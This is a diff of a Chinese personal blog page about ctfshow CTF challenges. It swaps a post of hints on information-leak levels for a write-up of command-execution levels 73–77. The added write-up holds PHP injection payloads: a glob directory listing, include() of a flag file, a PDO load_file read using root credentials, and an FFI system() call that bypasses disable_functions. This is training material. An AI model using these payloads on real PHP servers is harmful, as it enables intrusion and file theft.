@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ctfshow web入门 信息搜集, 博客,ctf,web">
+    <meta name="keywords" content="ctfshow-web入门-命令执行-53-77, 博客,ctf,web">
     <meta name="description" content="不会ACM，不会CTF，惨惨">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ctfshow web入门 信息搜集 | Rolemee的小破站</title>
+    <title>ctfshow-web入门-命令执行-53-77 | Rolemee的小破站</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -329,7 +329,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ctfshow web入门 信息搜集</h1>
+                    <h1 class="description center-align post-title">ctfshow-web入门-命令执行-53-77</h1>
                 </div>
             </div>
         </div>
@@ -453,6 +453,10 @@
                                 <span class="chip bg-color">WEB入门</span>
                             </a>
                         
+                            <a href="/tags/%E8%84%9A%E6%9C%AC/">
+                                <span class="chip bg-color">脚本</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -480,28 +484,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-07-13
+                    2021-07-17
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-13
+                    2021-07-17
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    273
+                    611
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -519,26 +523,59 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>进去按F12</p>
-<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>进去CTRL+shift+C或者加上view-source:</p>
-<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>抓包后返回头里有flag</p>
-<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>playload<code>/robots.txt</code>然后获得<code>/flagishere.txt</code> ，playload <code>/flagishere.txt</code>即可获得flag</p>
-<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>playload <code>/index.phps</code>得到文件打开后就有flag</p>
-<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>playload <code>/www.zip</code>得到文件后获得提示，访问/fl000g.txt</p>
-<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>git代码泄露，访问/.git/index.php</p>
-<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>svn代码泄露，访问/.svn/</p>
-<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>考察vim缓存信息泄露，直接访问url/.index.php.swp </p>
-<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>抓包看cookie</p>
-<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>通过dns检查查询flag <a target="_blank" rel="noopener" href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。</p>
-<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>访问/robots.txt得到/admin/，账号为admin，密码在页面最下面</p>
-<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>下载最下面的技术文档，得到后台地址和账号密码，登陆后得到flag</p>
-<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>无</p>
-<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>访问/admin,忘记密码，密保西安，重置</p>
-<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>访问/tz.php，进去后点击phpinfo获得flag</p>
-<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>ping <a target="_blank" rel="noopener" href="http://www.ctfshow.com/">www.ctfshow.com</a></p>
-<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>查看js通关的条件，得到一个网址，然后访问110.php</p>
-<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>F12查看以后，直接post发送账号密码</p>
-<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>直接访问/db/db.mdb后得到下载文件，然后直接打开</p>
+                <h2 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">Warning<span class="token punctuation">:</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">14</span>
+
+Warning<span class="token punctuation">:</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">15</span>
+
+Warning<span class="token punctuation">:</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">24</span>
+你要上天吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>老方法，现实glob伪协议</p>
+<pre class="line-numbers language-none"><code class="language-none">c&#x3D;%3F%3E%3C%3Fphp%0A%24a%3Dnew%20DirectoryIterator(%22glob%3A%2F%2F%2F*%22)%3B%0Aforeach(%24a%20as%20%24f)%0A%7Becho(%24f-%3E__toString().&#39;%20&#39;)%3B%0A%7D%0Aexit(0)%3B%0A%3F%3E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>拿到根目录，在flagc.txt中，于是使用<code>c=include(&quot;/flagc.txt&quot;);exit();</code></p>
+<p>拿到flag</p>
+<h2 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">Warning<span class="token punctuation">:</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">14</span>
+
+Warning<span class="token punctuation">:</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">15</span>
+
+Warning<span class="token punctuation">:</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">24</span>
+你要上天吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>老方法，现实glob伪协议</p>
+<pre class="line-numbers language-none"><code class="language-none">c&#x3D;%3F%3E%3C%3Fphp%0A%24a%3Dnew%20DirectoryIterator(%22glob%3A%2F%2F%2F*%22)%3B%0Aforeach(%24a%20as%20%24f)%0A%7Becho(%24f-%3E__toString().&#39;%20&#39;)%3B%0A%7D%0Aexit(0)%3B%0A%3F%3E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>拿到根目录，在flag36.txt中，于是使用<code>c=include(&quot;/flag36.txt&quot;);exit();</code></p>
+<p>发现include被禁用了，于是使用数据库链接</p>
+<pre class="line-numbers language-none"><code class="language-none">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,
+&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)
+&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-
+&gt;getMessage();exit(0);&#125;exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>拿到flag</p>
+<h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">Warning<span class="token punctuation">:</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">14</span>
+
+Warning<span class="token punctuation">:</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">15</span>
+
+Warning<span class="token punctuation">:</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">24</span>
+你要上天吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>老方法，现实glob伪协议</p>
+<pre class="line-numbers language-none"><code class="language-none">c&#x3D;%3F%3E%3C%3Fphp%0A%24a%3Dnew%20DirectoryIterator(%22glob%3A%2F%2F%2F*%22)%3B%0Aforeach(%24a%20as%20%24f)%0A%7Becho(%24f-%3E__toString().&#39;%20&#39;)%3B%0A%7D%0Aexit(0)%3B%0A%3F%3E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>拿到根目录，在flag36.txt中，于是使用<code>c=include(&quot;/flag36.txt&quot;);exit();</code></p>
+<p>发现include被禁用了，于是使用数据库链接</p>
+<pre class="line-numbers language-none"><code class="language-none">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,
+&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)
+&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-
+&gt;getMessage();exit(0);&#125;exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>也是不行，被禁用了，使用FFI，PHP&gt;=7.4时才行</p>
+<pre class="line-numbers language-none"><code class="language-none">c&#x3D;$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);&#x2F;&#x2F;创建一个system对象
+$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;&#x2F;&#x2F;没有回显的
+$ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>再去访问1.txt即可</p>
 
                 
             </div>
@@ -565,7 +602,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://rolemee.com/2021/07/13/ctfshow-web-ru-men-xin-xi-sou-ji/">https://rolemee.com/2021/07/13/ctfshow-web-ru-men-xin-xi-sou-ji/</a>
+                    <a href="https://rolemee.com/2021/07/17/ctfshow-web-ru-men-ming-ling-zhi-xing-73-77/">https://rolemee.com/2021/07/17/ctfshow-web-ru-men-ming-ling-zhi-xing-73-77/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -609,6 +646,10 @@
                             
                                 <a href="/tags/WEB%E5%85%A5%E9%97%A8/">
                                     <span class="chip bg-color">WEB入门</span>
+                                </a>
+                            
+                                <a href="/tags/%E8%84%9A%E6%9C%AC/">
+                                    <span class="chip bg-color">脚本</span>
                                 </a>
                             
                         </div>
@@ -780,17 +821,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/07/13/ctfshow-web-ru-men-bao-po/">
+                <a href="/2021/07/17/ctfshow-web-ru-men-ming-ling-zhi-xing-73-77/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="ctfshow-web入门-爆破">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="ctfshow-web入门-命令执行-53-77">
                         
-                        <span class="card-title">ctfshow-web入门-爆破</span>
+                        <span class="card-title">ctfshow-web入门-命令执行-53-77</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -800,9 +842,67 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-13
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ctfshow/" class="post-category">
+                                    ctfshow
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/WEB/">
+                        <span class="chip bg-color">WEB</span>
+                    </a>
+                    
+                    <a href="/tags/WEB%E5%85%A5%E9%97%A8/">
+                        <span class="chip bg-color">WEB入门</span>
+                    </a>
+                    
+                    <a href="/tags/%E8%84%9A%E6%9C%AC/">
+                        <span class="chip bg-color">脚本</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/07/16/ctfshow-web-ru-men-ming-ling-zhi-xing-72-rao-guo-disable-function-xian-zhi-he-open-basedir-xian-zhi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="ctfshow-web入门-命令执行-72(绕过disable_function限制和open_basedir限制)">
+                        
+                        <span class="card-title">ctfshow-web入门-命令执行-72(绕过disable_function限制和open_basedir限制)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            ctfshow web入门
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -826,53 +926,8 @@
                         <span class="chip bg-color">WEB入门</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/07/12/eakal-yyds/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Eakal,粟师傅yyds">
-                        
-                        <span class="card-title">Eakal,粟师傅yyds</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            test000
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-12
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Rolemee
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Typora/">
-                        <span class="chip bg-color">Typora</span>
-                    </a>
-                    
-                    <a href="/tags/Markdown/">
-                        <span class="chip bg-color">Markdown</span>
+                    <a href="/tags/%E8%84%9A%E6%9C%AC/">
+                        <span class="chip bg-color">脚本</span>
                     </a>
                     
                 </div>
